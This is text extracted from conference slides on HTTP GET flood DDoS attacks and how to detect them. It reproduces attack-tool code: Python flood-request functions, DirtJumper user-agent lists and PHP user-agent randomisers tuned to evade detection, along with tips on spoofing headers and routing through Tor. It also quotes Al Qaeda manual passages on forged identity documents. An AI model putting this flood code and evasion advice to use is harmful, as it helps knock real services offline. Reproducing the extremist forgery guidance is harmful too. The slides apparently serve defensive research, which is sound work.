Gecko/20090718 Firefox/3.5.1’) 
 headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/
532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1’) 
 headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; 
Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)’) 
 headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/
4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)’) 
 headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; 
x64; Trident/4.0)’) 
 headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/
4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)’) 
 headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)’) 
 headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)’) 
 headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51') 
 return(headers_useragents) 
Level 2.1 – HTTP GET Flood – static random 
DirtJumper v5 User Agent selector 
Level 2.2 – HTTP GET Flood – dynamic random 
#http request 
def httpcall(url): 
 request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + 
buildblock(random.randint(3,10))) 
 request.add_header('User-Agent', random.choice(headers_useragents)) 
 request.add_header('Cache-Control', 'no-cache’) 
 request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7’) 
 request.add_header('Referer', random.choice(headers_referers) + 
buildblock(random.randint(5,10))) 
 request.add_header('Keep-Alive', random.randint(110,120)) 
 request.add_header('Connection', 'keep-alive’) 
 request.add_header('Host',host) 
Don’t do unreasonable random for the sake of randomness confusion 
Normal HTTP keep-alive range doesn’t fall in this range 
Level 2.2 – HTTP GET Flood – dynamic random 
Uagent.php // random user-agent generator  
function nt_version()  
 return rand(5, 6) . '.' . rand(0, 1);  
function ie_version() // IE 
 return rand(7, 9) . '.0’; 
function osx_version() // need to add support for OSX10.10 J 
 return "10_" . rand(5, 7) . '_' . rand(0, 9); 
function chrome_version() 
 return rand(13, 15) . '.0.' . rand(800, 899) . '.0';  
Hint: Predict next version by time (build-in script) 
Level 2.2 – HTTP GET Flood – dynamic random 
Uagent.php // random user-agent generator  
function firefox($arch) { 
    $ver = array_random(array( 
     'Gecko/' . date('Ymd', rand(strtotime('2011-1-1'), time())) . ' Firefox/' . rand(5, 
7) . '.0’, 
     'Gecko/' . date('Ymd', rand(strtotime('2011-1-1'), time())) . ' Firefox/' . rand(5, 
7) . '.0.1’, 
     'Gecko/' . date('Ymd', rand(strtotime('2010-1-1'), time())) . ' Firefox/3.6.' . 
rand(1, 20), 
        'Gecko/' . date('Ymd', rand(strtotime('2010-1-1'), time())) . ' Firefox/3.8’ 
    )); 
    switch ($arch) { // firefox for Linux, Mac and Win with different processers 
    case 'lin’: 
        return "(X11; Linux {proc}; rv:" . rand(5, 7) . ".0) $ver"; 
    case 'mac': 
        $osx = osx_version(); 
        return "(Macintosh; {proc} Mac OS X $osx rv:" . rand(2, 6) . ".0) $ver »; 
    case 'win’: 
    default: 
        $nt = nt_version(); 
        return "(Windows NT $nt; {lang}; rv:1.9." . rand(0, 2) . ".20) $ver »; 
    } 
} 
Level 2.3 – HTTP GET Flood – smart random 
User-agents are not randomly distributed 
0% 
20% 
40% 
60% 
80% 
100% 
2002 
2004 
2006 
2008 
2010 
2012 
2014 
Others 
IE 
Firefox/Mozilla 
Chrome 
0% 
20% 
40% 
60% 
80% 
100% 
Legitimate UA distribution by year 
Attack UA distribution by year 
Level 2.3 – HTTP GET Flood – smart random 
User-agents are not randomly distribute 
function chooseRandomBrowserAndOS() { 
   $frequencies = array( 
        34 => array( 
            89 => array('chrome', 'win'), 
            9 => array('chrome', 'mac'), 
            2 => array('chrome', 'lin’) ), 
        32 => array( 
            100 => array('iexplorer', 'win’)), 
        25 => array( 
            83 => array('firefox', 'win'), 
            16 => array('firefox', 'mac'), 
            1 => array('firefox', 'lin’)), 
        7 => array( 
            95 => array('safari', 'mac'), 
            4 => array('safari', 'win'), 
            1 => array('safari', 'lin’)), 
        2 => array( 
            91 => array('opera', 'win'), 
            6 => array('opera', 'lin'), 
            3 => array('opera', 'mac’)) 
    ); 
Level 2.3 – HTTP GET Flood – dynamic random 
100% predictable URL and parameter 
100% predictable HTTP header order 
99% purely randomize in pre-defined character space 
 ADDRESS ORDERS MATTERS 
 - because RFC2616 HTTP/1.1 only 
specific required headers, not orders 
 - implementation of HTTP header order is 
depending on OS 
- Orders can be normalized / corrected 
  by CDN, thank you CDN J  
CHARACTER SPACE MATTERS 
- 
Pure random is easy to be detected 
- 
Attack character space didn’t fit with 
distribution of normal request 
Level 3.0 – HTTP GET Flood – emulated random 
Al Qaeda Handbook 
- The Manchester Manual 
Lesson 3 
Forged Documents  
(Identity Cards, Records Books, Passports)  
Forged Documents (Identity Cards, Records Books, Passports)  
The following security precautions should be taken:  
1. Keeping the passport in a safe place so it 
would not be ceized  by the security 
apparatus, and the brother it belongs to 
would have to negotiate its return (I’ll give 
you your passport if you give me 
information)  
2.  All documents of the undercover brother, 
such as identity cards and passport, should 
be falsified.  
3.  When the undercover brother is traveling 
with a certain identity card or passport, he 
should know all pertinent [information] 
such as the name, profession, and place of 
residence.  
Use Proxy 
X-forwarded-IP 
X-Client-IP 
Always spoof User-agent 
Behave and react  
as claimed, real UA 
Level 3.0 – HTTP GET Flood – emulated random 
4. The brother who has special work status 
(commander, communication link, ...) should 
have more than one identity card and passport. 
He should learn the contents of each, the nature 
of the [indicated] profession, and the dialect of 
the residence area listed in the document.  
5. The photograph of the brother in these 
documents should be without a beard. It is 
preferable that the brother’s public photograph 
[on these documents] be also without a beard. If 
he already has one [document] showing a 
photograph with a beard, he should replace it.  
6.  When using an identity document in different 
names, no more than one such document should 
be carried at one time.  
Use anonymous proxy 
Use anonymous network (TOR) 
Never use real IP to send 
 C&C command or send attack 
Don’t send too much traffic 
from a single machine 
Level 3.0 – HTTP GET Flood – emulated random 
Now attacks are emulating from real users, with 
Ø  Low request rate 
Ø  From normally distributed source IP (GEO-IP) 
Ø  Totally valid TCP and IP headers 
Ø  Legitimate user-agents  
Ø  Legitimate user-agents with up-to-date distribution  
Ø  Correct HTTP headers and orders 
Level 3.0 – HTTP GET Flood – emulated random 
p0f	
Passive, progressive, layered validation 
Level 3.0 – HTTP GET Flood – emulated random 
behavior	
Progressive, application specific  challenge,  
Level 3.0 – HTTP GET Flood – emulated random 
Level BOSS – DDoS the legitimate client 
Attacker knows your clients’ IPs 
Attacker knows your detection policies 
Attacker knows your mitigation filters 
Attacker can launch ‘targeted’ DDoS by spoofing legitimate client 
Proudly Present 
“APT Style” DDoS 
Level BOSS – DDoS the legitimate client 
False 
Positive  
False 
Negative 
A           +            B                = Constant 
Level BOSS – DDoS the legitimate client 
OR 
Draw this fractal with 2 lines of code 
Max. string 200 
One of the acceptable sample output: 
bhvbhdjmnnmbfjnfghjbnvghvbv  
Questions? 
Contact me via ‘random’ e-mail above